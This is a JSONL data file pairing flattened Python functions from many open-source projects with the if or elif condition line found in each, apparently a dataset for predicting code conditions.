{"input": "def custom_format(slither, result): elements = result[\"elements\"] for element in elements: target = element[\"additional_fields\"][\"target\"] convention = element[\"additional_fields\"][\"convention\"] if convention == \"l_O_I_should_not_be_used\": # l_O_I_should_not_be_used cannot be automatically patched logger.info( f'The following naming convention cannot be patched: \\n{result[\"description\"]}' ) continue _patch(slither, result, element, target)", "label": "if convention == \"l_O_I_should_not_be_used\" :"}
{"input": "def refresh(self): if self._obj: person = self._db.get_person_from_handle(self._obj.get_reference_handle()) if person: frel = str(self._obj.get_father_relation()) mrel = str(self._obj.get_mother_relation()) self._title = _(\"%(frel)s %(mrel)s\") % {\"frel\": frel, \"mrel\": mrel} self._value = person.get_primary_name().get_name()", "label": "if person :"}
{"input": "def append(self, child): if child not in (None, self): tag = child_tag(self._tag) if tag: if isinstance(child, Html): if child.tag != tag: child = Html(tag, child) elif not child.startswith(\"<%s\" % tag): child = Html(tag, child) super().append(child)", "label": "if tag :"}
{"input": "def _forward_main_responses(self): while self._should_keep_going(): line = self._proc.stdout.readline() if self._main_backend_is_fresh and self._looks_like_echo(line): # In the beginning the backend may echo commands sent to it (perhaps this echo-avoiding trick # takes time). Don't forward those lines. continue if not line: break with self._response_lock: sys.stdout.write(line) sys.stdout.flush() self._main_backend_is_fresh = False", "label": "if not line :"}
{"input": "def forward(self, inputs): x = inputs[\"image\"] out = self.conv0(x) out = self.downsample0(out) blocks = [] for i, conv_block_i in enumerate(self.darknet_conv_block_list): out = conv_block_i(out) if i == self.freeze_at: out.stop_gradient = True if i in self.return_idx: blocks.append(out) if i < self.num_stages - 1: out = self.downsample_list[i](out) return blocks", "label": "if i == self . freeze_at :"}
{"input": "def check_backslashes(payload): # Check for single quotes if payload.count(\"\\\\\") >= 15: if not settings.TAMPER_SCRIPTS[\"backslashes\"]: if menu.options.tamper: menu.options.tamper = menu.options.tamper + \",backslashes\" else: menu.options.tamper = \"backslashes\" from src.core.tamper import backslashes payload = backslashes.tamper(payload)", "label": "if menu . options . tamper :"}
{"input": "def __init__(self, config_lists): self.lens = len(config_lists) self.spaces = [] for config_list in config_lists: if isinstance(config_list, tuple): key, config = config_list elif isinstance(config_list, str): key = config_list config = None else: raise NotImplementedError( \"the type of config is Error!!! Please check the config information. Receive the type of config is {}\".format( type(config_list) ) ) self.spaces.append(self._get_single_search_space(key, config)) self.init_tokens()", "label": "if isinstance ( config_list , tuple ) :"}
{"input": "def _source_tuple(af, address, port): # Make a high level source tuple, or return None if address and port # are both None if address or port: if address is None: if af == socket.AF_INET: address = \"0.0.0.0\" elif af == socket.AF_INET6: address = \"::\" else: raise NotImplementedError(f\"unknown address family {af}\") return (address, port) else: return None", "label": "if address is None :"}
{"input": "def test_compatibility(self) -> None: for expected, user_agent in self.data: result = self.client_get(\"/compatibility\", HTTP_USER_AGENT=user_agent) if expected == \"ok\": self.assert_json_success(result) elif expected == \"old\": self.assert_json_error(result, \"Client is too old\") else: assert False # nocoverage", "label": "if expected == \"ok\" :"}
{"input": "def __init__(self, parent_element): if parent_element.items(): self.update(dict(parent_element.items())) for element in parent_element: if len(element) > 0: if element.tag == element[0].tag: aDict = ListParser(element) else: aDict = DictParser(element) if element.items(): aDict.update(dict(element.items())) self.update({element.tag: aDict}) elif element.items(): self.update({element.tag: dict(element.items())}) else: self.update({element.tag: element.text})", "label": "if element . tag == element [ 0 ] . tag :"}
{"input": "def delta_page(self, x: float = 0.0, y: float = 0.0) -> None: if y.is_integer(): y = int(y) if y == 0: pass elif y < 0: self.page_up(count=-y) elif y > 0: self.page_down(count=y) y = 0 if x == 0 and y == 0: return size = self._widget.page().mainFrame().geometry() self.delta(int(x * size.width()), int(y * size.height()))", "label": "if y == 0 :"}
{"input": "def reader(self, myself): ok = True line = \"\" while True: line = sys.stdin.readline().strip() if ok: if not line: ok = False continue elif not line: break else: ok = True self.Q.append(line) os.kill(myself, signal.SIGTERM)", "label": "if ok :"}
{"input": "def leave(self, reason=None): try: if self.id.startswith(\"C\"): log.info(\"Leaving channel %s (%s)\", self, self.id) self._bot.webclient.channels_leave(channel=self.id) else: log.info(\"Leaving group %s (%s)\", self, self.id) self._bot.webclient.groups_leave(channel=self.id) except SlackAPIResponseError as e: if e.error == \"user_is_bot\": raise RoomError(f\"Unable to leave channel. {USER_IS_BOT_HELPTEXT}\") else: raise RoomError(e) self._id = None", "label": "if e . error == \"user_is_bot\" :"}
{"input": "def wrap_lines(text, cols=60): ret = \"\" words = re.split(\"(\\s+)\", text) linelen = 0 for w in words: if linelen + len(w) > cols - 1: ret += \" \\\\\\n\" ret += \" \" linelen = 0 if linelen == 0 and w.strip() == \"\": continue ret += w linelen += len(w) return ret", "label": "if linelen + len ( w ) > cols - 1 :"}
{"input": "def transport_vmware_guestinfo(): rpctool = \"vmware-rpctool\" not_found = None if not subp.which(rpctool): return not_found cmd = [rpctool, \"info-get guestinfo.ovfEnv\"] try: out, _err = subp.subp(cmd) if out: return out LOG.debug(\"cmd %s exited 0 with empty stdout: %s\", cmd, out) except subp.ProcessExecutionError as e: if e.exit_code != 1: LOG.warning(\"%s exited with code %d\", rpctool, e.exit_code) LOG.debug(e) return not_found", "label": "if e . exit_code != 1 :"}
{"input": "def handle_noargs(self, **options): # Inspired by Postfix's \"postconf -n\". from django.conf import settings, global_settings # Because settings are imported lazily, we need to explicitly load them. settings._setup() user_settings = module_to_dict(settings._wrapped) default_settings = module_to_dict(global_settings) output = [] for key in sorted(user_settings.keys()): if key not in default_settings: output.append(\"%s = %s ###\" % (key, user_settings[key])) elif user_settings[key] != default_settings[key]: output.append(\"%s = %s\" % (key, user_settings[key])) return \"\\n\".join(output)", "label": "if key not in default_settings :"}
{"input": "def channel_sizes(self): \"\"\"List of channel sizes: [(width, height)].\"\"\" sizes = [] for channel in self.channel_info: if channel.id == ChannelID.USER_LAYER_MASK: sizes.append((self.mask_data.width, self.mask_data.height)) elif channel.id == ChannelID.REAL_USER_LAYER_MASK: sizes.append((self.mask_data.real_width, self.mask_data.real_height)) else: sizes.append((self.width, self.height)) return sizes", "label": "elif channel . id == ChannelID . REAL_USER_LAYER_MASK :"}
{"input": "def get(self, key, default=None, version=None): fname = self._key_to_file(key, version) try: with io.open(fname, \"rb\") as f: if not self._is_expired(f): return pickle.loads(zlib.decompress(f.read())) except IOError as e: if e.errno != errno.ENOENT: raise return default", "label": "if e . errno != errno . ENOENT :"}
{"input": "def check_grads(grads_and_vars): has_nan_ops = [] amax_ops = [] for grad, _ in grads_and_vars: if grad is not None: if isinstance(grad, tf.IndexedSlices): x = grad.values else: x = grad has_nan_ops.append(tf.reduce_any(tf.is_nan(x))) amax_ops.append(tf.reduce_max(tf.abs(x))) has_nan = tf.reduce_any(has_nan_ops) amax = tf.reduce_max(amax_ops) return has_nan, amax", "label": "if grad is not None :"}
{"input": "def daily(self, component): with component.repository.lock: path = self.get_linguas_path(component) if self.sync_linguas(component, path): self.commit_and_push(component, [path])", "label": "if self . sync_linguas ( component , path ) :"}
{"input": "def _set_posonly_args_def(self, argmts, vals): for v in vals: argmts.posonlyargs.append(v[\"arg\"]) d = v[\"default\"] if d is not None: argmts.defaults.append(d) elif argmts.defaults: self._set_error(\"non-default argument follows default argument\")", "label": "elif argmts . defaults :"}
{"input": "def isOrHasChild(parent, child): while child: if compare(parent, child): return True child = child.parentNode if not child: return False if child.nodeType != 1: child = None return False", "label": "if child . nodeType != 1 :"}
{"input": "def Proc2(IntParIO): IntLoc = IntParIO + 10 while 1: if Char1Glob == \"A\": IntLoc = IntLoc - 1 IntParIO = IntLoc - IntGlob EnumLoc = Ident1 if EnumLoc == Ident1: break return IntParIO", "label": "if Char1Glob == \"A\" :"}
{"input": "def _GetParserChains(self, events): \"\"\"Return a dict with a plugin count given a list of events.\"\"\" parser_chains = {} for event in events: parser_chain = getattr(event, \"parser\", None) if not parser_chain: continue if parser_chain in parser_chains: parser_chains[parser_chain] += 1 else: parser_chains[parser_chain] = 1 return parser_chains", "label": "if parser_chain in parser_chains :"}
{"input": "def _url_encode_impl(obj, charset, encode_keys, sort, key): iterable = sdict() for key, values in obj.items(): if not isinstance(values, list): values = [values] iterable[key] = values if sort: iterable = sorted(iterable, key=key) for key, values in iterable.items(): for value in values: if value is None: continue if not isinstance(key, bytes): key = str(key).encode(charset) if not isinstance(value, bytes): value = str(value).encode(charset) yield url_quote_plus(key) + \"=\" + url_quote_plus(value)", "label": "if value is None :"}
{"input": "def getZoneOffset(d): zoffs = 0 try: if d[\"zulu\"] == None: zoffs = 60 * int(d[\"tzhour\"]) + int(d[\"tzminute\"]) if d[\"tzsign\"] != \"-\": zoffs = -zoffs except TypeError: pass return zoffs", "label": "if d [ \"tzsign\" ] != \"-\" :"}
{"input": "def run(self): predictor = DefaultPredictor(self.cfg) while True: task = self.task_queue.get() if isinstance(task, AsyncPredictor._StopToken): break idx, data = task result = predictor(data) self.result_queue.put((idx, result))", "label": "if isinstance ( task , AsyncPredictor . _StopToken ) :"}
{"input": "def _VarRefOrWord(node, dynamic_arith): # type: (arith_expr_t, bool) -> bool with tagswitch(node) as case: if case(arith_expr_e.VarRef): return True elif case(arith_expr_e.Word): if dynamic_arith: return True return False", "label": "if dynamic_arith :"}
{"input": "def command(self, reset=True, wait=True, wait_all=False, quiet=False): try: if self._idx(reset=reset, wait=wait, wait_all=wait_all, quiet=quiet): return self._success(_(\"Loaded metadata index\")) else: return self._error(_(\"Failed to load metadata index\")) except IOError: return self._error(_(\"Failed to decrypt configuration, \" \"please log in!\"))", "label": "if self . _idx ( reset = reset , wait = wait , wait_all = wait_all , quiet = quiet ) :"}
{"input": "def init_weights(self): for module in self.decoder.modules(): if isinstance(module, (nn.Linear, nn.Embedding)): module.weight.data.normal_(mean=0.0, std=0.02) elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) if isinstance(module, nn.Linear) and module.bias is not None: module.bias.data.zero_() for p in self.generator.parameters(): if p.dim() > 1: xavier_uniform_(p) else: p.data.zero_()", "label": "if isinstance ( module , nn . Linear ) and module . bias is not None :"}
{"input": "def write_conditional_formatting(worksheet): \"\"\"Write conditional formatting to xml.\"\"\" wb = worksheet.parent for range_string, rules in iteritems(worksheet.conditional_formatting.cf_rules): cf = Element(\"conditionalFormatting\", {\"sqref\": range_string}) for rule in rules: if rule.dxf is not None: if rule.dxf != DifferentialStyle(): rule.dxfId = len(wb._differential_styles) wb._differential_styles.append(rule.dxf) cf.append(rule.to_tree()) yield cf", "label": "if rule . dxf is not None :"}
{"input": "def _format_changelog(self, changelog): \"\"\"Format the changelog correctly and convert it to a list of strings\"\"\" if not changelog: return changelog new_changelog = [] for line in changelog.strip().split(\"\\n\"): line = line.strip() if line[0] == \"*\": new_changelog.extend([\"\", line]) elif line[0] == \"-\": new_changelog.append(line) else: new_changelog.append(\" \" + line) # strip trailing newline inserted by first changelog entry if not new_changelog[0]: del new_changelog[0] return new_changelog", "label": "if line [ 0 ] == \"*\" :"}
{"input": "def __prep_write_total(self, comments, main, fallback, single): lower = self.as_lowercased() for k in [main, fallback, single]: if k in comments: del comments[k] if single in lower: parts = lower[single].split(\"/\", 1) if parts[0]: comments[single] = [parts[0]] if len(parts) > 1: comments[main] = [parts[1]] if main in lower: comments[main] = lower.list(main) if fallback in lower: if main in comments: comments[fallback] = lower.list(fallback) else: comments[main] = lower.list(fallback)", "label": "if parts [ 0 ] :"}
{"input": "def __str__(self): result = [] for mask, quality in self._parsed: if quality != 1: mask = \"%s;q=%0.*f\" % ( mask, min(len(str(quality).split(\".\")[1]), 3), quality, ) result.append(mask) return \", \".join(result)", "label": "if quality != 1 :"}
{"input": "def allprocs(self): common.set_plugin_members(self) tasksaddr = self.addr_space.profile.get_symbol(\"_tasks\") queue_entry = obj.Object(\"queue_entry\", offset=tasksaddr, vm=self.addr_space) seen = [tasksaddr] for task in queue_entry.walk_list(list_head=tasksaddr): if task.bsd_info and task.obj_offset not in seen: proc = task.bsd_info.dereference_as(\"proc\") yield proc seen.append(task.obj_offset)", "label": "if task . bsd_info and task . obj_offset not in seen :"}
{"input": "def __walk_dir_tree(self, dirname): dir_list = [] self.__logger.debug(\"__walk_dir_tree. START dir=%s\", dirname) for f in os.listdir(dirname): current = os.path.join(dirname, f) if os.path.isfile(current) and f.endswith(\"py\"): if self.module_registrant: self._load_py_from_file(current) dir_list.append(current) elif os.path.isdir(current): ret = self.__walk_dir_tree(current) if ret: dir_list.append((f, ret)) return dir_list", "label": "elif os . path . isdir ( current ) :"}
{"input": "def get_code(self, address: Address) -> bytes: validate_canonical_address(address, title=\"Storage Address\") code_hash = self.get_code_hash(address) if code_hash == EMPTY_SHA3: return b\"\" else: try: return self._journaldb[code_hash] except KeyError: raise MissingBytecode(code_hash) from KeyError finally: if code_hash in self._get_accessed_node_hashes(): self._accessed_bytecodes.add(address)", "label": "if code_hash in self . _get_accessed_node_hashes ( ) :"}
{"input": "def _strftime(value): if datetime: if isinstance(value, datetime.datetime): return \"%04d%02d%02dT%02d:%02d:%02d\" % ( value.year, value.month, value.day, value.hour, value.minute, value.second, ) if not isinstance(value, (TupleType, time.struct_time)): if value == 0: value = time.time() value = time.localtime(value) return \"%04d%02d%02dT%02d:%02d:%02d\" % value[:6]", "label": "if value == 0 :"}
{"input": "def _read_mol2_records(filename): lines = [] start = True with open(filename) as handle: for line in handle: if line.startswith(\"@<TRIPOS>MOLECULE\"): if start: start = False else: yield lines lines = [] lines.append(line)", "label": "if start :"}
{"input": "def set_column_strategy(self, attrs, strategy, opts=None, opts_only=False): strategy = self._coerce_strat(strategy) self.is_class_strategy = False for attr in attrs: cloned = self._generate() cloned.strategy = strategy cloned._generate_path(self.path, attr, \"column\") cloned.propagate_to_loaders = True if opts: cloned.local_opts.update(opts) if opts_only: cloned.is_opts_only = True cloned._set_path_strategy() self.is_class_strategy = False", "label": "if opts_only :"}
{"input": "def decryptBlock(self, encryptedBlock): \"\"\"Decrypt a single block\"\"\" if self.decryptBlockCount == 0: # first call, process IV if self.iv == None: # auto decrypt IV? self.prior_CT_block = encryptedBlock return \"\" else: assert len(self.iv) == self.blockSize, \"Bad IV size on CBC decryption\" self.prior_CT_block = self.iv dct = self.baseCipher.decryptBlock(encryptedBlock) \"\"\" XOR the prior decrypted CT with the prior CT \"\"\" dct_XOR_priorCT = xor(self.prior_CT_block, dct) self.prior_CT_block = encryptedBlock return dct_XOR_priorCT", "label": "if self . iv == None :"}
{"input": "def frontend_visible_config(config_dict): visible_dict = {} for name in CLIENT_WHITELIST: if name.lower().find(\"secret\") >= 0: raise Exception(\"Cannot whitelist secrets: %s\" % name) if name in config_dict: visible_dict[name] = config_dict.get(name, None) if \"ENTERPRISE_LOGO_URL\" in config_dict: visible_dict[\"BRANDING\"] = visible_dict.get(\"BRANDING\", {}) visible_dict[\"BRANDING\"][\"logo\"] = config_dict[\"ENTERPRISE_LOGO_URL\"] return visible_dict", "label": "if \"ENTERPRISE_LOGO_URL\" in config_dict :"}
{"input": "def write(self, s): if self.closed: raise ValueError(\"write to closed file\") if type(s) not in (unicode, str, bytearray): # See issue #19481 if isinstance(s, unicode): s = unicode.__getitem__(s, slice(None)) elif isinstance(s, str): s = str.__str__(s) elif isinstance(s, bytearray): s = bytearray.__str__(s) else: raise TypeError(\"must be string, not \" + type(s).__name__) return self.shell.write(s, self.tags)", "label": "elif isinstance ( s , bytearray ) :"}
{"input": "def __get_kb_shortcuts(directory, filename, default_shortcuts, min_shortcuts): shortcutstr, source = __read_first_in_directory_tree(directory, filename) if shortcutstr is None: shortcutstr = __read_or_default(filename, default_shortcuts) if shortcutstr == default_shortcuts: source = \"[default kb_shortcuts]\" else: source = filename kb_shortcuts = __parse_kb_shortcuts(shortcutstr, min_shortcuts, source) return kb_shortcuts", "label": "if shortcutstr == default_shortcuts :"}
{"input": "def demo(): d = StatusProgressDialog(\"A Demo\", \"Doing something...\") import win32api for i in range(100): if i == 50: d.SetText(\"Getting there...\") if i == 90: d.SetText(\"Nearly done...\") win32api.Sleep(20) d.Tick() d.Close()", "label": "if i == 50 :"}
{"input": "def __getattribute__(self, item): try: val = self[item] if isinstance(val, str): val = import_string(val) elif isinstance(val, (list, tuple)): val = [import_string(v) if isinstance(v, str) else v for v in val] self[item] = val except KeyError: val = super(ObjDict, self).__getattribute__(item) return val", "label": "elif isinstance ( val , ( list , tuple ) ) :"}
{"input": "def clear(self, key: Optional[str] = None): with self.lock: if key is not None: try: rv = self.data[key] self._heap_acc.remove((rv.acc, key)) self._heap_exp.remove((rv.exp, key)) del self.data[key] return except Exception: return self.data.clear() self._heap_acc = [] self._heap_exp = []", "label": "if key is not None :"}
{"input": "def resolve(self, path): match = self.regex.search(path) if match: # If there are any named groups, use those as kwargs, ignoring # non-named groups. Otherwise, pass all non-named arguments as # positional arguments. kwargs = match.groupdict() if kwargs: args = () else: args = match.groups() # In both cases, pass any extra_kwargs as **kwargs. kwargs.update(self.default_args) return ResolverMatch(self.callback, args, kwargs, self.name)", "label": "if kwargs :"}
{"input": "def check_selected(menu, path): selected = False if \"url\" in menu: chop_index = menu[\"url\"].find(\"?\") if chop_index == -1: selected = path.startswith(menu[\"url\"]) else: selected = path.startswith(menu[\"url\"][:chop_index]) if \"menus\" in menu: for m in menu[\"menus\"]: _s = check_selected(m, path) if _s: selected = True if selected: menu[\"selected\"] = True return selected", "label": "if _s :"}
{"input": "def check_match(word, word_list): matches = set() not_matches = set() for word2 in word_list: match = truncate_qgram(word, word2) if match > 0.6: matches.add((word, word2)) else: not_matches.add((word, word2)) return matches, not_matches", "label": "if match > 0.6 :"}
{"input": "def _fatal_error(self, exc, message=\"Fatal error on pipe transport\"): # should be called by exception handler only if isinstance(exc, (BrokenPipeError, ConnectionResetError)): if self._loop.get_debug(): logger.debug(\"%r: %s\", self, message, exc_info=True) else: self._loop.call_exception_handler( { \"message\": message, \"exception\": exc, \"transport\": self, \"protocol\": self._protocol, } ) self._close(exc)", "label": "if self . _loop . get_debug ( ) :"}
{"input": "def remove_existing_header(contents): \"remove existing legal header, if any\" retval = [] skipping = False start_pattern = re.compile(r\"^(/[*]BEGIN_LEGAL)|(#BEGIN_LEGAL)\") stop_pattern = re.compile(r\"^[ ]*(END_LEGAL[ ]?[*]/)|(#[ ]*END_LEGAL)\") for line in contents: if start_pattern.match(line): skipping = True if skipping == False: retval.append(line) if stop_pattern.match(line): skipping = False return retval", "label": "if stop_pattern . match ( line ) :"}
{"input": "def load_model(self, model_dict): model_param = None model_meta = None for _, value in model_dict[\"model\"].items(): for model in value: if model.endswith(\"Meta\"): model_meta = value[model] if model.endswith(\"Param\"): model_param = value[model] LOGGER.info(\"load model\") self.set_model_meta(model_meta) self.set_model_param(model_param) self.loss = self.get_loss_function()", "label": "if model . endswith ( \"Param\" ) :"}
{"input": "def __call__(self, exc_type, exc_value, exc_tb): if not isinstance(exc_value, SystemExit): enriched_tb = add_missing_qt_frames(exc_tb) if exc_tb else exc_tb for handler in self._handlers: if handler.handle(exc_type, exc_value, enriched_tb): break", "label": "if handler . handle ( exc_type , exc_value , enriched_tb ) :"}
{"input": "def skip_to_semicolon(s, i): n = len(s) while i < n: c = s[i] if c == \";\": return i elif c == \"'\" or c == '\"': i = g.skip_string(s, i) elif g.match(s, i, \"//\"): i = g.skip_to_end_of_line(s, i) elif g.match(s, i, \"/*\"): i = g.skip_block_comment(s, i) else: i += 1 return i", "label": "elif g . match ( s , i , \"/*\" ) :"}
{"input": "def validate(self, signature, timestamp, nonce): if not self.token: raise WeixinMsgError(\"weixin token is missing\") if self.expires_in: try: timestamp = int(timestamp) except ValueError: return False delta = time.time() - timestamp if delta < 0 or delta > self.expires_in: return False values = [self.token, str(timestamp), str(nonce)] s = \"\".join(sorted(values)) hsh = hashlib.sha1(s.encode(\"utf-8\")).hexdigest() return signature == hsh", "label": "if delta < 0 or delta > self . expires_in :"}
{"input": "def terminate(self): \"\"\"Terminates process (sends SIGTERM)\"\"\" if not self._proc is None: if IS_WINDOWS: # Windows self._proc.terminate() elif HAS_SUBPROCESS: # Gio.Subprocess self._proc.send_signal(15) else: # subprocess.Popen self._proc.terminate() self._proc = None if IS_WINDOWS: self._stdout.close() self._cancel.cancel()", "label": "if IS_WINDOWS :"}
{"input": "def clear_bijector(bijector, _, state): if not isinstance(bijector, tfp.bijectors.Bijector): return # skip submodules that are not bijectors _clear_bijector_cache(bijector) if isinstance(bijector, tfp.bijectors.Chain): # recursively clear caches of sub-bijectors for m in bijector.submodules: if isinstance(m, tfp.bijectors.Bijector): _clear_bijector_cache(m) return state", "label": "if isinstance ( m , tfp . bijectors . Bijector ) :"}
{"input": "def sanitize_args(a): try: args, kwargs = a if isinstance(args, tuple) and isinstance(kwargs, dict): return args, dict(kwargs) except (TypeError, ValueError): args, kwargs = (), {} if a is not None: if isinstance(a, dict): args = tuple() kwargs = a elif isinstance(a, tuple): if isinstance(a[-1], dict): args, kwargs = a[0:-1], a[-1] else: args = a kwargs = {} return args, kwargs", "label": "elif isinstance ( a , tuple ) :"}
{"input": "def do_DELE(self, path): \"\"\"Delete the specified file.\"\"\" try: path = self.ftp_path(path) if not self.config.vfs.isfile(path): self.respond(b\"550 Failed to delete file.\") else: with self.config.vfs.check_access(path=path, user=self._uid, perms=\"w\"): self.config.vfs.remove(path) self.respond(b\"250 File removed.\") except FSOperationNotPermitted: self.respond(b\"500 Operation not permitted.\") except (fs.errors.FSError, FilesystemError, FTPPrivilegeException): self.respond(b\"550 Failed to delete file.\")", "label": "if not self . config . vfs . isfile ( path ) :"}
{"input": "def _get_conn(self): \"\"\"Get ServerProxy instance\"\"\" if self.username and self.password: if self.scheme == \"scgi\": raise NotImplementedError() secure = self.scheme == \"https\" return self.sp( self.uri, transport=BasicAuthTransport(secure, self.username, self.password), **self.sp_kwargs ) return self.sp(self.uri, **self.sp_kwargs)", "label": "if self . scheme == \"scgi\" :"}
{"input": "def output(self): \"\"\"Transform self into a list of (name, value) tuples.\"\"\" header_list = [] for k, v in self.items(): if isinstance(k, unicodestr): k = self.encode(k) if not isinstance(v, basestring): v = str(v) if isinstance(v, unicodestr): v = self.encode(v) # See header_translate_* constants above. # Replace only if you really know what you're doing. k = k.translate(header_translate_table, header_translate_deletechars) v = v.translate(header_translate_table, header_translate_deletechars) header_list.append((k, v)) return header_list", "label": "if isinstance ( k , unicodestr ) :"}
{"input": "def gprv_implicit_orax(ii): for i, op in enumerate(_gen_opnds(ii)): if i == 0: if op.name == \"REG0\" and op_luf(op, \"GPRv_SB\"): continue else: return False elif i == 1: if op.name == \"REG1\" and op_luf(op, \"OrAX\"): continue else: return False else: return False return True", "label": "if i == 0 :"}
{"input": "def one_xmm_reg_imm8(ii): # also allows SSE4 2-imm8 instr i, j, n = 0, 0, 0 for op in _gen_opnds(ii): if op_reg(op) and op_xmm(op): n += 1 elif op_imm8(op): i += 1 elif op_imm8_2(op): j += 1 else: return False return n == 1 and i == 1 and j <= 1", "label": "if op_reg ( op ) and op_xmm ( op ) :"}
{"input": "def pa(s, l, tokens): for attrName, attrValue in attrs: if attrName not in tokens: raise ParseException(s, l, \"no matching attribute \" + attrName) if attrValue != withAttribute.ANY_VALUE and tokens[attrName] != attrValue: raise ParseException( s, l, \"attribute '%s' has value '%s', must be '%s'\" % (attrName, tokens[attrName], attrValue), )", "label": "if attrName not in tokens :"}
{"input": "def __code_color(self, code): if code in self.last_dist.keys(): if int(code) == 0: return self.screen.markup.GREEN elif int(code) == 314: return self.screen.markup.MAGENTA else: return self.screen.markup.RED else: return \"\"", "label": "elif int ( code ) == 314 :"}
{"input": "def loop_check(self): in_loop = [] # Add the tag for dfs check for node in self.nodes: node.dfs_loop_status = \"DFS_UNCHECKED\" # Now do the job for node in self.nodes: # Run the dfs only if the node has not been already done */ if node.dfs_loop_status == \"DFS_UNCHECKED\": self.dfs_loop_search(node) # If LOOP_INSIDE, must be returned if node.dfs_loop_status == \"DFS_LOOP_INSIDE\": in_loop.append(node) # Remove the tag for node in self.nodes: del node.dfs_loop_status return in_loop", "label": "if node . dfs_loop_status == \"DFS_LOOP_INSIDE\" :"}
{"input": "def _append_modifier(code, modifier): if modifier == \"euro\": if \".\" not in code: return code + \".ISO8859-15\" _, _, encoding = code.partition(\".\") if encoding in (\"ISO8859-15\", \"UTF-8\"): return code if encoding == \"ISO8859-1\": return _replace_encoding(code, \"ISO8859-15\") return code + \"@\" + modifier", "label": "if \".\" not in code :"}
{"input": "def propagate_touch_to_touchable_widgets(self, touch, touch_event, *args): triggered = False for i in self._touchable_widgets: if i.collide_point(touch.x, touch.y): triggered = True if touch_event == \"down\": i.on_touch_down(touch) elif touch_event == \"move\": i.on_touch_move(touch, *args) elif touch_event == \"up\": i.on_touch_up(touch) return triggered", "label": "if touch_event == \"down\" :"}
{"input": "def body(self): order = [ \"ok_header\", \"affected_rows\", \"last_insert_id\", \"server_status\", \"warning_count\", \"state_track\", \"info\", ] string = b\"\" for key in order: item = getattr(self, key) section_pack = b\"\" if item is None: continue elif isinstance(item, bytes): section_pack = item else: section_pack = getattr(self, key).toStringPacket() string += section_pack self.setBody(string) return self._body", "label": "if item is None :"}
{"input": "def get_opnd_types_short(ii): types = [] for op in _gen_opnds(ii): if op.oc2: types.append(op.oc2) elif op_luf_start(op, \"GPRv\"): types.append(\"v\") elif op_luf_start(op, \"GPRz\"): types.append(\"z\") elif op_luf_start(op, \"GPRy\"): types.append(\"y\") else: die(\"Unhandled op type {}\".format(op)) return types", "label": "elif op_luf_start ( op , \"GPRz\" ) :"}
{"input": "def load_name(self, name): if name in self.args: index = self.args[name] if index is None: self.add_opcodes(JavaOpcodes.ALOAD_2(), java.Map.get(name)) else: self.add_opcodes( JavaOpcodes.ALOAD_1(), java.Array.get(index), ) else: self.add_opcodes( ALOAD_name(\"#module\"), python.Object.get_attribute(name), )", "label": "if index is None :"}
{"input": "def get_field_type(self, name): fkey = (name, self.dummy) target = None op, name = name.split(\"_\", 1) if op in {\"delete\", \"insert\", \"update\"}: target = super().get_field_type(name) if target is None: module, edb_name = self.get_module_and_name(name) target = self.edb_schema.get((module, edb_name), None) if target is not None: target = self.convert_edb_to_gql_type(target) self._fields[fkey] = target return target", "label": "if target is not None :"}
{"input": "def _parse_lines(self, lines): for line in lines: self.size += len(line) words = line.strip().split(\"\\t\") if len(words) > 1: wset = set(words[1:]) if words[0] in self.WORDS: self.WORDS[words[0]] |= wset else: self.WORDS[words[0]] = wset", "label": "if len ( words ) > 1 :"}
{"input": "def get_new_id(self) -> str: with db.session.no_autoflush: identifier = self.issued_at.strftime(\"%Y%mU-\") + \"%06d\" % ( EventInvoice.query.count() + 1 ) count = EventInvoice.query.filter_by(identifier=identifier).count() if count == 0: return identifier return self.get_new_id()", "label": "if count == 0 :"}
{"input": "def complete_use(self, text, *args, **kwargs): if text: all_possible_matches = filter( lambda x: x.startswith(text), self.main_modules_dirs ) matches = set() for match in all_possible_matches: head, sep, tail = match[len(text) :].partition(\".\") if not tail: sep = \"\" matches.add(\"\".join((text, head, sep))) return list(matches) else: return self.main_modules_dirs", "label": "if not tail :"}
{"input": "def get_arg_list_scalar_arg_dtypes(arg_types): result = [] for arg_type in arg_types: if isinstance(arg_type, ScalarArg): result.append(arg_type.dtype) elif isinstance(arg_type, VectorArg): result.append(None) if arg_type.with_offset: result.append(np.int64) else: raise RuntimeError(\"arg type not understood: %s\" % type(arg_type)) return result", "label": "elif isinstance ( arg_type , VectorArg ) :"}
{"input": "def psea(pname): \"\"\"Parse PSEA output file.\"\"\" fname = run_psea(pname) start = 0 ss = \"\" with open(fname) as fp: for l in fp: if l[0:6] == \">p-sea\": start = 1 continue if not start: continue if l[0] == \"\\n\": break ss = ss + l[0:-1] return ss", "label": "if l [ 0 : 6 ] == \">p-sea\" :"}
{"input": "def pad_with_zeros(logits, labels): \"\"\"Pad labels on the length dimension to match logits length.\"\"\" with tf.name_scope(\"pad_with_zeros\", values=[logits, labels]): logits, labels = pad_to_same_length(logits, labels) if len(labels.shape) == 3: # 2-d labels. logits, labels = pad_to_same_length(logits, labels, axis=2) return logits, labels", "label": "if len ( labels . shape ) == 3 :"}
{"input": "def set_rating(self, value, songs, librarian): count = len(songs) if count > 1 and config.getboolean(\"browsers\", \"rating_confirm_multiple\"): parent = qltk.get_menu_item_top_parent(self) dialog = ConfirmRateMultipleDialog(parent, _(\"Change _Rating\"), count, value) if dialog.run() != Gtk.ResponseType.YES: return for song in songs: song[\"~#rating\"] = value librarian.changed(songs)", "label": "if dialog . run ( ) != Gtk . ResponseType . YES :"}
{"input": "def test_schema_plugin_name_mismatch(self): # todo iterate over all clouds not just aws resources for k, v in manager.resources.items(): for fname, f in v.filter_registry.items(): if fname in (\"or\", \"and\", \"not\"): continue self.assertIn(fname, f.schema[\"properties\"][\"type\"][\"enum\"]) for aname, a in v.action_registry.items(): self.assertIn(aname, a.schema[\"properties\"][\"type\"][\"enum\"])", "label": "if fname in ( \"or\" , \"and\" , \"not\" ) :"}
{"input": "def run(self, elem): \"\"\"Inline check for attrs at start of tail.\"\"\" if elem.tail: m = self.INLINE_RE.match(elem.tail) if m: self.assign_attrs(elem, m.group(1)) elem.tail = elem.tail[m.end() :]", "label": "if m :"}
{"input": "def _traverse(op): if topi.tag.is_broadcast(op.tag): if not op.same_as(output.op): if not op.axis: const_ops.append(op) else: ewise_ops.append(op) for tensor in op.input_tensors: if isinstance(tensor.op, tvm.te.PlaceholderOp): ewise_inputs.append((op, tensor)) else: _traverse(tensor.op) else: assert op.tag == \"dense_pack\" dense_res.append(op)", "label": "if not op . axis :"}
